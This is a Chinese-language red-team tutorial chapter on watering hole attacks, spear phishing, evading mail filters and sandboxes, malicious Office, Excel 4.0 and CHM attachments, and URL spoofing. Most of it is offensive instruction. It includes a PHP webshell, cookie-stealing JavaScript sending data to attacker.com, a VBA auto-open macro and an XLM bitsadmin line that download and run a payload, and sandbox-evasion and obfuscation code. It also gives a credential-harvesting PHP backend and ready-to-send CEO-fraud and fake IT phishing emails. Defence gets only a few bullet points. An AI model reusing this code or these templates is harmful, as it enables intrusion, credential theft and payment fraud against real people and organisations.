## 68.1 水坑攻击（Watering Hole）原理与实战

> **核心类比：不在路上拦你，在你常去的水源下毒**
>
> 非洲草原上，狮子想捕猎羚羊。追着跑太累了（相当于直接攻击）。
> 聪明的狮子会在水坑边等着——**羚羊总是要来喝水的**。
>
> 水坑攻击就是这个道理：攻击者不直接攻击目标公司，而是攻破目标员工**经常访问的网站**（水坑），在那里"下毒"。员工自己"走过去喝水"，就中毒了。
>
> **为什么比直接攻击更危险？**
> - 直接攻击：目标警惕性高，防火墙拦着，WAF护着
> - 水坑攻击：员工友好地打开自己信任的网站——"这网站我天天上，安全的"
> - 心理防线：对陌生人警惕，对老朋友松懈——这就被利用了

### 68.1.1 什么是水坑攻击

水坑攻击（Watering Hole Attack）是一种高级的社会工程学攻击方式，其核心思想是：**攻击者不直接攻击目标，而是攻击目标经常访问的网站，然后等待目标自己"上钩"**。

就像动物总会去固定的水源喝水一样，人们也总会访问一些固定的网站。攻击者在这些网站上"下毒"，等待目标来访。

### 68.1.2 水坑攻击的特点

| 特点 | 说明 |
|------|------|
| **精准度高** | 只针对访问特定网站的人群 |
| **隐蔽性强** | 目标访问的是自己信任的网站，警惕性低 |
| **成功率高** | 利用了用户对常用网站的信任 |
| **难以溯源** | 攻击入口在第三方网站，难以直接追溯到攻击者 |
| **被动等待** | 攻击者不需要主动发送邮件，目标自动上门 |

### 68.1.3 水坑攻击的完整流程

```
第一步：情报收集
    ↓
    分析目标人群常访问的网站
    行业论坛、技术社区、内部系统、供应商门户等
    ↓
第二步：选择水坑站点
    ↓
    选择安全防护较弱的目标网站
    评估网站的访问量和目标匹配度
    ↓
第三步：攻陷水坑站点
    ↓
    通过漏洞、弱口令等方式入侵网站
    植入恶意代码或后门
    ↓
第四步：植入攻击载荷
    ↓
    在网站上注入恶意脚本
    或者放置恶意文件供下载
    或者伪造登录页面
    ↓
第五步：等待目标上钩
    ↓
    目标正常访问网站
    触发恶意代码或下载恶意文件
    ↓
第六步：获取权限
    ↓
    利用漏洞获取目标主机权限
    或者窃取账号密码
    ↓
第七步：后渗透利用
    ↓
    横向移动、权限提升、数据窃取等
```

### 68.1.4 常见的水坑攻击类型

#### 类型一：网站挂马
- 在目标常访问的网站上植入恶意代码
- 利用浏览器漏洞执行恶意代码
- 直接获取目标主机控制权

#### 类型二：伪造登录页面
- 在网站上伪造登录入口
- 窃取用户账号密码
- 然后跳转到真实登录页面

#### 类型三：恶意软件下载
- 在软件下载站替换正常软件
- 在安装包中植入后门
- 用户下载安装后中招

#### 类型四：供应链攻击
- 攻击软件供应商
- 在软件更新中植入恶意代码
- 所有使用该软件的用户都会受影响

### 68.1.5 如何选择水坑目标

#### 1. 行业垂直网站
- 金融行业：财经网站、证券论坛
- 医疗行业：医学论坛、医疗资讯站
- 教育行业：校园论坛、教师社区
- 政府行业：政务资讯、公务员论坛

#### 2. 技术社区
- GitHub、Stack Overflow
- CSDN、掘金、博客园
- 各种技术论坛

#### 3. 企业相关站点
- 供应商门户
- 合作伙伴网站
- 企业员工常用的外部工具

#### 4. 生活服务类
- 外卖、快递查询
- 天气、交通
- 招聘、求职网站

### 68.1.6 水坑攻击的实施步骤详解

#### 步骤一：情报收集与目标分析

首先需要了解目标人群的上网习惯：

```bash
# 通过社交媒体分析目标兴趣
# 查看目标的关注列表、点赞内容

# 通过招聘信息分析技术栈
# 推断目标可能访问的技术社区

# 通过行业报告分析常用工具
# 确定目标可能访问的网站类型

# 通过DNS数据历史分析
# 查看目标企业的访问记录（如果能获取）
```

信息收集的方法包括：
- **OSINT收集**：通过开源情报分析目标的上网习惯
- **社会工程学**：通过电话、邮件等方式套取信息
- **流量分析**：如果能接触到目标网络，分析流量数据
- **历史数据分析**：利用历史泄露数据推断

#### 步骤二：水坑站点探测与筛选

确定候选网站后，需要评估其安全性：

```bash
# 使用WhatWeb识别网站技术栈
whatweb target-site.com

# 使用Nmap扫描端口和服务
nmap -sV target-site.com

# 使用Dirb/Dirbuster扫描目录
dirb http://target-site.com

# 使用Wappalyzer分析技术栈
# 浏览器插件，可视化查看

# 使用Nikto扫描漏洞
nikto -h http://target-site.com
```

筛选标准：
- **访问量**：目标人群访问量要足够大
- **安全性**：网站安全性较低，容易攻破
- **相关性**：与目标人群高度相关
- **可控性**：攻破后能稳定控制一段时间

#### 步骤三：攻陷水坑站点

根据网站的技术栈选择攻击方式：

**常见攻击方式：**
1. **CMS漏洞利用**：WordPress、Drupal、Joomla等漏洞
2. **SQL注入**：通过注入获取后台权限
3. **弱口令/暴力破解**：后台登录、FTP、SSH等
4. **文件上传漏洞**：上传WebShell
5. **第三方组件漏洞**：插件、主题、编辑器等

```php
<?php
// 简单的WebShell示例
// 上传到被攻陷的网站，用于后续控制

if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    system($cmd);
}
?>
```

#### 步骤四：植入攻击载荷

攻陷网站后，根据攻击目标选择植入方式：

**方式一：注入恶意JavaScript**
```javascript
// 在网站页面中注入恶意脚本
// 用于窃取Cookie、记录键盘、重定向等

// 示例：窃取Cookie并发送到攻击者服务器
(function(){
    var img = new Image();
    img.src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
})();
```

**方式二：重定向到钓鱼页面**
```javascript
// 判断是否是目标IP段，如果是则重定向到钓鱼页面
(function(){
    // 获取目标IP（需要后端支持，这里简化）
    // 如果匹配目标范围，则跳转到钓鱼页面
    // 否则正常显示页面
    var targetPatterns = ['192.168.', '10.0.', '172.16.'];
    // 实际中需要通过后端获取真实IP
})();
```

**方式三：替换下载文件**
```php
<?php
// 替换网站上的软件下载链接
// 当用户下载时，返回带后门的版本

$file = $_GET['file'];
$allowed_files = ['software.exe', 'installer.msi'];

if(in_array($file, $allowed_files)){
    // 返回植入后门的版本
    header('Content-Type: application/octet-stream');
    readfile('/path/to/malicious/' . $file);
}
?>
```

### 68.1.7 水坑攻击的检测与防御

#### 防御方视角
- **网站防护**：定期更新、Web应用防火墙、入侵检测
- **终端防护**：EDR、杀毒软件、浏览器沙箱
- **网络防护**：流量监测、DNS过滤、URL信誉
- **安全意识**：员工培训、安全意识提升

#### 红队视角
- 水坑攻击的成功率很高，但实施难度大
- 需要先攻陷第三方网站，法律风险更高
- 适合高价值目标，值得投入大量资源
- 要做好OPSEC，避免通过第三方网站溯源

## 68.2 鱼叉式钓鱼的高级技巧

### 68.2.1 为什么需要高级鱼叉钓鱼

普通的钓鱼邮件很容易被检测出来，而高级鱼叉钓鱼（Spear Phishing）则是：

- **高度定制化**：针对特定个人或组织
- **信息充分**：基于大量情报收集
- **场景真实**：完全模拟真实业务场景
- **难以检测**：内容、格式、语气都很真实

### 68.2.2 高级鱼叉钓鱼的准备工作

#### 深度情报收集

**目标个人信息收集：**
```
个人基本信息：
  - 姓名、职位、部门
  - 邮箱、电话、办公地址
  - 入职时间、工作经历
  
工作相关信息：
  - 负责的业务和项目
  - 常用的工具和系统
  - 汇报关系、团队成员
  - 近期的工作动态

个人特征信息：
  - 性格特点、办事风格
  - 兴趣爱好、生活习惯
  - 社交媒体活动
  - 常去的网站和论坛
```

**情报收集的渠道：**
1. **企业官网**：团队介绍、新闻动态、招聘信息
2. **LinkedIn/脉脉**：职业经历、技能、人脉
3. **社交媒体**：微博、微信、朋友圈（如果能获取）
4. **技术社区**：GitHub、博客、论坛发言
5. **历史泄露数据**：以前的数据泄露记录
6. **社会工程学**：电话、邮件套取信息

#### 身份伪装准备

**伪装身份的选择：**
- **内部IT人员**：最常见，权限高，容易获得信任
- **上级领导**：权威性高，下级不敢质疑
- **合作伙伴**：业务往来，有合理的联系理由
- **HR/行政**：涉及薪资、福利、培训，关注度高
- **客户/供应商**：业务相关，有沟通基础

**身份伪装的细节：**
```
真实的个人信息：
  - 真实姓名（找一个真实存在的人）
  - 真实职位和部门
  - 真实的联系方式

背景信息准备：
  - 这个人的工作职责
  - 近期的工作动态
  - 说话风格和习惯
  - 常用的话术和术语

技术层面准备：
  - 相似的邮箱地址
  - 相似的签名格式
  - 相似的信纸模板
  - 匹配的发送时间
```

### 68.2.3 经典高级鱼叉钓鱼场景

#### 场景一：领导交办任务（CEO Fraud）

**攻击原理**：伪装成公司高管，向下属发送紧急任务指令。

**邮件示例：**
```
发件人：张总 <zhangzong@company-cn.com>
收件人：李经理 <lijingli@company.com>
主题：紧急 - 关于XX项目的付款事宜

小李：

刚和王总开完会，XX项目那边催得紧，需要紧急支付一笔预付款。
你赶紧联系一下对方的陈经理，把合同款先打过去，合同我稍后补签。

对方账户信息：
户名：XX科技有限公司
账号：6222 XXXX XXXX XXXX
开户行：XX银行

金额：38.6万元

这事很急，今天之内必须办好。办好了告诉我一声。

张总
```

**关键技巧：**
1. **制造紧迫感**："紧急"、"今天必须办好"
2. **利用权威**：高管身份，下级不敢质疑
3. **理由充分**：项目预付款，听起来合理
4. **后续动作**："合同稍后补签"，解释为什么没有正常流程

#### 场景二：IT系统升级通知

**攻击原理**：伪装成IT部门，通知系统升级，要求用户登录验证。

**邮件示例：**
```
发件人：IT运维部 <it-support@company-cn.com>
收件人：全体员工 <all-staff@company.com>
主题：【重要通知】邮箱系统升级，请及时验证

各位同事：

为提升邮箱系统性能，IT部将于今晚20:00-24:00进行系统升级。

验证地址：http://mail.company-cn.com/verify

请使用您的邮箱账号和密码登录验证，未验证的账户将在升级后暂停使用。

如有问题，请联系IT支持：内线 8888

IT运维部
202X年X月X日
```

**关键技巧：**
1. **全员发送**：覆盖面广，总有上钩的
2. **后果明确**："未验证将暂停使用"，制造压力
3. **域名相似**：company-cn.com 和 company.com 很像
4. **页面仿真**：钓鱼页面和真实登录页面一模一样

#### 场景三：薪资调整通知

**攻击原理**：利用员工对薪资的关注，诱导点击链接或打开附件。

**邮件示例：**
```
发件人：人力资源部 <hr@company-cn.com>
收件人：张三 <zhangsan@company.com>
主题：【保密】关于您的薪资调整通知

人力资源部
202X年X月X日

附件：薪资调整明细.docm
```

**关键技巧：**
1. **个人化**：收件人是具体的某个人
2. **隐私性**："保密"、"勿与他人讨论"，降低被转发发现的概率
3. **利益相关**：薪资调整，每个人都关心
4. **附件携带**：docm文件包含宏，打开后执行恶意代码

#### 场景四：会议通知/会议纪要

**攻击原理**：伪装成会议组织者，发送会议通知或纪要。

**邮件示例：**

### 68.2.4 高级鱼叉钓鱼的核心技巧

#### 技巧一：域名选择与混淆

**常见域名欺骗手法：**

| 手法 | 示例 | 说明 |
|------|------|------|
| **拼写错误** | googgle.com | 多一个字母或少一个字母 |
| **字母替换** | g00gle.com | 用数字0替换字母o |
| **加前缀后缀** | mail-google.com | 添加常见前缀或后缀 |
| **子域名欺骗** | google.com.evil.com | 真实域名在前面 |
| **同形异义字** | paypaI.com | 用大写i替换小写L |
| **国际域名** | goógle.com | 使用Unicode字符 |
| **顶级域替换** | google.net | 换个顶级域名 |

**域名选择的艺术：**
```
最佳欺骗域名：
  1. 和真实域名只差一个字符
  2. 看起来很合理，不突兀
  3. 能够注册到
  4. 有SSL证书（Let's Encrypt免费申请）

常见前缀：
  - mail- / webmail- / email-
  - it- / support- / help-
  - hr- / admin- / staff-
  - vip- / secure- / login-
```

#### 技巧二：发送时机选择

**最佳发送时间：**
- **周一上午**：刚上班，邮件多，容易放松警惕
- **周五下午**：快下班了，心思不在工作上
- **节假日前一天**：人心浮动，急于处理完事情
- **刚上班半小时内**：还没进入工作状态
- **快下班一小时内**：想赶紧完事走人

**避开的时间：**
- **刚开完安全会议**：警惕性最高的时候
- **安全月/安全周**：大家都在提防
- **凌晨或深夜**：太反常，容易引起怀疑

#### 技巧三：邮件内容打磨

**语言风格要点：**
1. **匹配身份**：领导说话要有领导的语气，IT说话要专业
2. **适度口语化**：太正式反而显得假，适当口语化更真实
3. **有小瑕疵**：完全没有错误的邮件反而可疑，加一两个小问题
4. **合理的紧迫感**：要有理由为什么紧急，不能凭空说紧急

**格式细节：**
- 字体、字号和真实邮件一致
- 签名格式完全照搬
- 公司logo、信纸模板一模一样
- 邮件头部的样式也要匹配

#### 技巧四：多级钓鱼策略

不要一上来就要密码或下载文件，可以分步进行：

**第一级：建立联系**
- 发送一封正常的邮件，建立沟通
- 比如询问一个业务问题
- 让目标回复，建立信任

**第二级：逐步深入**
- 第二封邮件开始引入主题
- 比如"上次和你说的那个系统要升级"
- 因为有前一封邮件铺垫，显得更自然

**第三级：实施攻击**
- 到第三封邮件才放出钓鱼链接或附件
- 这时候目标已经完全信任了
- 成功率会高很多

## 68.3 钓鱼邮件的免杀与绕过（反垃圾邮件/反钓鱼）

> **核心类比：怎么让一封"诈骗信"不被邮局拦截**
>
> 把反垃圾邮件系统想象成邮局的**分拣中心**。每封信到了分拣中心，邮局会用多种方式判断："这是不是垃圾广告？"
>
> | 分拣规则 | 邮局怎么做 | 钓鱼攻击怎么绕过 |
> |---------|-----------|----------------|
> | **查发件地址信誉** | 这个邮筒之前是不是发过垃圾邮件？ | 新建清白的邮筒，先发正常信件"养信誉" |
> | **查信件格式** | 邮票是不是假的？信封格式对不对？ | 配置SPF/DKIM/DMARC，格式完全合规 |
> | **查信件内容** | 里面有没有"推广"、"免费"这类关键词？ | 避免敏感词，用图片代替敏感文字 |
> | **查附件** | 附件是不是.exe病毒？ | 用Office宏/CHM等"合法格式"，内部藏恶意代码 |
> | **查链接** | 链接是不是已知的钓鱼网站？ | 用新域名、短链接、多重跳转 |
>
> **核心理念：让钓鱼邮件的"外观"（发件、格式、内容）和正常邮件完全一样，只在用户点击之后才露出真面目。**

### 68.3.2 发件人信誉优化

#### IP信誉维护

**获取高信誉IP：**
- 使用云服务商的IP（AWS、阿里云等）
- 购买有历史信誉的IP段
- 使用邮件发送服务（SendGrid、Mailgun等）
- 慢慢"养"IP，先发正常邮件积累信誉

**IP暖身（Warm-up）：**
```

第2天：每天发30-50封
第3天：每天发50-100封
...
逐步增加到目标发送量

注意：
  - 发送的邮件要有人打开、有人点击
  - 不要全部都是无效地址
  - 保持稳定的发送频率
  - 监控退信率和投诉率
```

#### 域名信誉

**域名选择要点：**
- 注册时间越长越好
- 有正常的网站内容
- 有正常的DNS记录
- 配置SPF、DKIM、DMARC

**避免使用：**
- 刚注册的新域名
- 有不良历史的域名
- 包含太多敏感词的域名
- 和知名品牌太像的域名（容易被标记）

### 68.3.3 邮件认证绕过

#### SPF绕过思路

**什么是SPF：**
- SPF记录指定了哪些IP可以发送该域名的邮件
- 接收方检查发件IP是否在SPF记录中

**绕过方法：**
1. **找SPF配置宽松的域名**：`~all` 或 `?all` 的
2. **利用SPF解析限制**：DNS查询次数超过10次可能失效
3. **使用子域名**：主域名有SPF但子域名可能没有
4. **找允许大量IP的**：比如包含很多网段的SPF记录

#### DKIM绕过思路

**什么是DKIM：**
- 发件方用私钥对邮件内容签名
- 接收方用公钥（DNS TXT记录）验证签名

**绕过方法：**
1. **使用没有DKIM的域名**：很多小域名没有配置DKIM
2. **找DKIM配置错误的**：选择符错误、密钥泄露等
3. **签名头伪造**：某些情况下可以伪造DKIM-Signature头

#### DMARC策略

**DMARC策略级别：**
- `none`：只监控，不做处理
- `quarantine`：可疑邮件放入垃圾箱
- `reject`：直接拒绝

**绕过思路：**
- 找 `p=none` 的域名，即使认证失败也不会被拒收
- 利用子域名：`sp=none` 可能对子域名更宽松

### 68.3.4 内容检测绕过

**常见敏感词：**

4. **用HTML混淆**：`<span>密</span><span>码</span>`
5. **用Unicode变体**：全角字符、特殊字符

#### 附件检测绕过

**常见检测方式：**
- 文件扩展名检查
- 文件头/MIME类型检查

**绕过方法：**

### 68.3.5 沙箱绕过

**什么是沙箱：**
- 在隔离环境中运行可疑文件
- 观察行为，判断是否恶意

**沙箱的弱点：**
- 有时间限制（通常几分钟）
- 资源有限（内存、CPU）
- 不是真实的用户环境
- 可能有特征可以检测

**常见绕过手法：**
1. **延迟执行**：等待很长时间再执行恶意代码
2. **检测沙箱特征**：检测沙箱特有的进程、文件、注册表
3. **需要用户交互**：必须点击或键盘输入才执行
4. **环境检查**：检查CPU核心数、内存大小、硬盘大小
5. **条件触发**：只有满足特定条件才执行

**沙箱检测示例（VBA）：**
```vba
Sub SandboxCheck()
    ' 检查硬盘大小（沙箱通常硬盘很小）
    Set objWMIService = GetObject("winmgmts:")
    Set colDisks = objWMIService.ExecQuery("Select * from Win32_LogicalDisk Where DeviceID = 'C:'")
    
    For Each objDisk In colDisks
        If objDisk.Size < 50000000000 Then ' 小于50G可能是沙箱
            Exit Sub
        End If
    Next
    
    ' 检查内存大小
    Set colMemory = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
    For Each objMemory In colMemory
        If objMemory.TotalPhysicalMemory < 2000000000 Then ' 小于2G
            Exit Sub
        End If
    Next
    
    ' 检查是否有鼠标（沙箱可能没有真实鼠标）
    ' ... 更多检测
    
    ' 检测通过，执行真实恶意代码
    RealPayload()
End Sub
```

## 68.4 附件钓鱼（Office宏/Excel 4.0宏/PPT/CHM等）

> **核心类比：特洛伊木马——外表是礼物，内部藏着士兵**
>
> 附件钓鱼是所有钓鱼手段中最古老也最高效的方式之一。它的本质就是**特洛伊木马**：
> 你收到一个看起来完全正常的Word文档/Excel表格，打开看——里面确实是正常内容。但就在你打开的一瞬间，藏在里面的宏代码悄悄运行了，下载并执行了真正的恶意程序。
>
> **为什么Office宏这么危险？**
> 1. **格式是"合法"的**：.docx/.xlsx 是企业日常交流用文件，没人会觉得不安全
> 2. **杀软不会随便删Office文件**：删了.docx，明天员工就没法工作了
> 3. **宏是"功能"不是"漏洞"**：微软设计宏就是为了自动化操作，你只是在利用这个功能
> 4. **双重封套**：外层是"正常文档内容"打消用户疑虑，内层是"自动运行的宏"执行恶意代码
>
> **一句话总结：把刀藏在笔记本书皮里，安检只觉得这是本笔记本。**

### 68.4.1 附件钓鱼概述

附件钓鱼是指通过邮件附件传播恶意代码的攻击方式。用户打开附件后，恶意代码自动执行，获取主机控制权。

**常见的恶意附件类型：**

| 类型 | 扩展名 | 说明 | 危险性 |
|------|--------|------|--------|
| **Office宏文档** | .docm, .xlsm, .pptm | 包含VBA宏代码 | 高 |
| **Excel 4.0宏** | .xls, .xlsm | 旧版Excel宏，更隐蔽 | 极高 |
| **CHM帮助文件** | .chm | 编译HTML帮助，可执行代码 | 高 |
| **HTA应用** | .hta | HTML应用，可执行脚本 | 高 |
| **脚本文件** | .js, .vbs, .wsf | 直接执行脚本 | 中 |
| **可执行文件** | .exe, .scr, .bat | 直接运行程序 | 高（但易被拦截） |
| **快捷方式** | .lnk | 指向恶意程序 | 中 |
| **ISO/IMG镜像** | .iso, .img | 虚拟光驱文件，自动播放 | 高 |

### 68.4.2 Office宏钓鱼（VBA）

#### 基本原理

Office支持VBA（Visual Basic for Applications）宏，可以自动化执行各种操作。恶意宏可以执行系统命令、下载运行程序等。

#### 简单宏示例

```vba
' 最简单的恶意宏 - 弹出计算器
Sub AutoOpen()
    ' 文档打开时自动执行
    Shell "calc.exe", vbNormalFocus
End Sub
```

**自动执行的宏名：**
- `AutoOpen` / `Document_Open`：文档打开时执行
- `AutoExec` / `Auto_Open`：启动时执行
- `Workbook_Open`：Excel工作簿打开时
- `Auto_Close` / `Document_Close`：关闭时执行
- `AutoNew`：新建文档时

#### 宏病毒实战

**第一步：创建恶意文档**

```vba
' 完整的恶意宏示例
' 功能：下载并执行Payload

Sub Document_Open()
    On Error Resume Next ' 出错继续，防止弹窗
    
    ' 1. 创建XMLHTTP对象下载文件
    Set xmlhttp = CreateObject("Microsoft.XMLHTTP")
    xmlhttp.Open "GET", "http://attacker.com/payload.exe", False
    xmlhttp.Send
    
    ' 2. 保存文件到临时目录
    Set ado = CreateObject("ADODB.Stream")
    ado.Type = 1 ' 二进制
    ado.Open
    ado.Write xmlhttp.responseBody
    ado.SaveToFile Environ("TEMP") & "\update.exe", 2 ' 覆盖保存
    ado.Close
    
    ' 3. 执行下载的文件
    Shell Environ("TEMP") & "\update.exe", vbHide
    
    ' 4. 显示正常内容，掩盖痕迹
    MsgBox "文档加载完成！", vbInformation, "提示"
End Sub
```

**第二步：诱骗用户启用宏**

默认情况下，Office会禁用宏，需要用户手动启用。所以需要诱骗用户点击"启用内容"。

**常见的诱骗话术：**

| 场景 | 话术 |
|------|------|
| **文档保护** | "本文档已加密保护，请启用宏以查看内容" |
| **版本兼容** | "请启用宏以兼容旧版本格式" |
| **验证身份** | "请启用宏以验证您的身份" |
| **数据加载** | "正在加载数据，请启用宏以继续" |
| **安全提示** | "为确保文档安全，请点击启用内容" |

**页面设计技巧：**
- 做一个假的"启用宏"按钮图片，看起来像按钮
- 用大大的文字写"请点击上方的 启用内容 按钮"
- 加个箭头指向真实的启用宏按钮位置
- 背景弄成灰色或模糊，营造"未启用"的视觉效果

#### 宏免杀基础

**混淆VBA代码：**
```vba
' 混淆前
Shell "cmd.exe /c calc.exe"

' 混淆后 - 字符串拼接
s = "c" & "m" & "d" & "." & "e" & "x" & "e"
Shell s & " /c " & "c" & "a" & "l" & "c" & "." & "e" & "x" & "e"

' 混淆后 - 字符串反转
s = "exe.cmdec / exe.plac"
s = StrReverse(s)
Shell s

' 混淆后 - 用Chr函数
Shell Chr(99) & Chr(109) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
```

**躲避检测的技巧：**
1. 分割字符串，不要出现完整的敏感词
2. 使用变量存储函数名，用CallByName调用
3. 加入大量无关的"垃圾代码"增加分析难度
4. 使用加密，运行时解密执行
5. 分阶段执行，先下载第二阶段载荷

### 68.4.3 Excel 4.0宏（XLM）

#### 什么是Excel 4.0宏

Excel 4.0宏（也叫XLM宏）是Excel早期的宏语言，比VBA更古老，但至今仍然被Excel支持。

**特点：**
- 不是VBA，是Excel 4.0时代的宏表函数
- 存储在特殊的"宏表"（Macro Sheet）中
- 很多安全产品检测不到（因为太老了，或者忽略了）
- 可以执行系统命令，功能强大

#### Excel 4.0宏实战

**创建步骤：**
1. 打开Excel
2. 右键点击工作表标签 → 插入 → MS Excel 4.0宏表
3. 在宏表中写入宏代码
4. 将第一个单元格命名为 `Auto_Open`（自动执行）
5. 保存为 .xls 或 .xlsm 格式

**简单示例：**
```
A1: =EXEC("calc.exe")
A2: =RETURN()
```

**完整攻击示例：**
```
A1: =ALERT("文档已损坏，请点击确定修复")
A2: =EXEC("cmd.exe /c ""bitsadmin /transfer job /download /priority normal http://attacker.com/payload.exe %TEMP%\p.exe && %TEMP%\p.exe""")
A3: =RETURN()
```

设置A1的单元格名称为 `Auto_Open`，这样打开文件时自动执行。

#### 为什么XLM宏更危险

1. **检测率低**：很多杀毒软件不检测XLM宏
2. **更隐蔽**：宏表可以隐藏起来，用户看不到
3. **用户熟悉度低**：大多数人不知道还有这种宏
4. **默认支持**：Excel仍然支持这种旧格式

### 68.4.4 CHM文件钓鱼

#### 什么是CHM文件

CHM（Compiled HTML Help）是微软的编译HTML帮助文件格式，常用于软件帮助文档。

**危险之处：**
- CHM内部可以包含HTML、JavaScript、VBScript
- 可以执行系统命令
- 可以打开可执行文件
- 用户通常认为CHM是安全的帮助文件

#### CHM攻击实战

**CHM项目文件（.hhp）：**
```
[OPTIONS]
Compatibility=1.0
Compiled file=update.chm
Default topic=index.htm
Display compile progress=No
Language=0x804 中文

[FILES]
index.htm
```

**index.htm内容：**
```html
<html>
<head>
<title>更新说明</title>
<script type="text/javascript">
    // 利用CHM的Shortcut功能执行程序
    function exec() {
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("cmd.exe /c calc.exe");
    }
</script>
</head>
<body onload="exec()">
    <h1>正在更新...</h1>
    <p>请稍候，正在安装更新...</p>
</body>
</html>
```

**编译CHM：**
使用HTML Help Workshop编译.chm文件。

## 68.5 链接钓鱼与URL跳转

### 68.5.1 链接钓鱼概述

链接钓鱼是指通过各种手段伪装URL，诱导用户点击后访问钓鱼网站。

### 68.5.2 URL结构与欺骗点

**URL的完整结构：**
```
https://user:pass@www.example.com:8080/path/to/page?query=1#fragment
  |       |      |            |          |            |          |
  |       |      |            |          |            |          └─ 片段
  |       |      |            |          |            └─ 查询参数
  |       |      |            |          └─ 路径
  |       |      |            └─ 端口
  |       |      └─ 主机名（域名）
  |       └─ 认证信息（用户名:密码）
  └─ 协议
```

**关键认知：用户主要看域名部分**
- 大多数用户不会仔细看完整URL
- 只看一眼域名感觉对就点了
- 可以利用这种心理进行欺骗

### 68.5.3 常见URL欺骗手法

#### 手法一：@符号欺骗

**原理：** URL中@符号前面的是用户认证信息，后面的才是真实域名。

**示例：**
```
http://www.baidu.com@www.evil.com
```

用户看到前面有baidu.com，以为是百度的链接，实际上真实域名是@后面的evil.com。

**注意：** 现代浏览器大多会提示或阻止这种URL了。

#### 手法二：子域名欺骗

**原理：** 把真实品牌放在子域名位置，借势欺骗。

**示例：**
```
http://login.bank.com.evil.com
     |<-- 看起来像银行的 -->| 但其实真实域名是evil.com
```

用户一眼看去，"login.bank.com" 全在前面，感觉就是银行的登录页。

#### 手法三：URL编码混淆

**原理：** 用百分号编码把域名编码，看起来乱七八糟的。

**示例：**
```
http://%77%77%77%2e%65%76%69%6c%2e%63%6f%6d/
```

解码后是 `www.evil.com`，但用户一般不会去解码。

#### 手法四：IP地址欺骗

**原理：** 直接用IP地址，或者把IP转换成数字。

**示例：**
```
http://192.168.1.100/
http://3232235876/    （192.168.1.100的十进制表示）
```

用户看到一串数字，不知道是什么，可能就点了。

#### 手法五：短链接

**原理：** 使用短链接服务，隐藏真实URL。

**常见短链接服务：**
- bit.ly
- t.cn（新浪短链接）
- url.cn
- tinyurl.com
- 各种自定义短链接服务

**优势：**
- 短，看起来干净
- 隐藏真实目标URL
- 短链接域名通常信誉好

### 68.5.4 URL重定向跳转

#### 什么是URL重定向

URL重定向是指访问一个URL后，自动跳转到另一个URL。

**重定向类型：**
- **301永久重定向**：HTTP状态码301
- **302临时重定向**：HTTP状态码302
- **Meta刷新**：HTML的meta标签
- **JavaScript跳转**：JS代码跳转

#### 利用正常网站跳转

**思路：** 找正常网站的跳转功能，让它跳转到钓鱼页面。

**常见的跳转点：**
1. **搜索引擎跳转链接**
   ```
   https://www.baidu.com/link?url=...
   https://www.google.com/url?sa=t&url=...
   ```

2. **网站外链跳转**
   很多论坛、博客点击外链时会先跳转到一个提示页面，再跳转。

3. **短链接服务**
   前面提到的各种短链接。

4. **OAuth授权跳转**
   一些网站的OAuth登录有redirect_uri参数。

5. **各种统计/分析服务的跳转**
   邮件跟踪、链接统计等。

#### 开放重定向（Open Redirect）漏洞

**什么是开放重定向：**
网站的跳转功能没有验证目标URL的合法性，用户可以构造跳转到任意地址。

**常见场景：**
- 登录后跳转：`login.php?redirect=xxx`
- 退出后跳转：`logout.php?next=xxx`
- 广告/推广跳转：`go.php?url=xxx`
- 外链跳转：`link.php?to=xxx`

**漏洞示例：**
```php
<?php
// 存在开放重定向漏洞的代码
$url = $_GET['url'];
header("Location: " . $url);
?>
```

**利用方式：**
```
https://www.real-site.com/redirect.php?url=http://evil.com/phish
```

用户看到前面是real-site.com（真实网站），信任这个链接，点击后跳转到evil.com的钓鱼页面。

### 68.5.5 浏览器地址栏欺骗

#### 历史上的地址栏欺骗

过去有很多浏览器漏洞可以伪造地址栏显示，但现在大多被修复了：
- 特殊字符导致地址栏显示异常
- 超长URL导致真实域名被挤出去
- Unicode字符混淆（IDN homograph攻击）

#### IDN同形异义字攻击

**原理：** 不同的Unicode字符看起来一模一样。

**示例：**
- 拉丁字母 `a`（U+0061）和西里尔字母 `а`（U+0430）
- 拉丁字母 `o`（U+006F）和西里尔字母 `о`（U+043E）
- 拉丁字母 `p`（U+0070）和西里尔字母 `р`（U+0440）

**攻击示例：**
```
真实域名：paypal.com
欺骗域名：pаypal.com （第二个a是西里尔字母）
```

两个域名看起来一模一样，但完全是不同的域名。

**现代浏览器的防御：**
- Chrome/Firefox等会检测这种情况
- 如果域名中有可疑的混合字符，会显示punycode编码
- 比如 `xn--pypal-4ve.com`

### 68.5.6 钓鱼页面的跳转逻辑

好的钓鱼页面不会让用户察觉，要有完整的跳转逻辑：

```
用户点击钓鱼链接
    ↓
进入钓鱼页面（和真实页面一模一样）
    ↓
用户输入账号密码，点击登录
    ↓
后台记录账号密码
    ↓
显示"登录失败，密码错误"（让用户以为自己输错了）
    ↓
跳转到真实网站的登录页面
    ↓
用户再次输入密码，成功登录
    ↓
用户以为是自己第一次输错了，完全没察觉
```

**实现代码示例（PHP）：**
```php
<?php
// phish.php - 钓鱼页面后端

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // 记录账号密码
    file_put_contents('passwords.txt', 
        $username . ':' . $password . "\n", FILE_APPEND);
    
    // 跳转到真实网站，并带上错误提示
    // 让用户以为第一次输错了
    header('Location: https://real-site.com/login?error=1');
    exit;
}
?>
```

### 68.5.7 链接钓鱼的高级技巧

#### 链接预热

给链接增加"可信度"：
- 先发一封邮件，里面有正常链接
- 目标点击过，发现没问题
- 第二封邮件再发钓鱼链接
- 因为上次点过没事，这次就放松了

#### 多链接混合

一封邮件里放多个链接：
- 大部分是真实的正常链接
- 只有1-2个是钓鱼链接
- 降低被检测到的概率
- 用户点了几个正常的，就信任这封邮件了

#### 二维码钓鱼

把钓鱼链接做成二维码：
- 手机扫码直接访问
- 用户不会仔细看URL
- 绕过邮件网关的URL检测
- 更有迷惑性

## 68.6 二维码钓鱼

### 68.6.1 什么是二维码钓鱼

二维码钓鱼（QR Phishing / QRLJacking）是指将钓鱼链接制作成二维码，诱导用户扫码访问钓鱼网站。

### 68.6.2 二维码钓鱼的优势

1. **绕过检测**：邮件网关不会扫描图片里的二维码
2. **用户不看URL**：扫码直接访问，没人会仔细看地址栏
3. **移动端为主**：手机上更难发现钓鱼
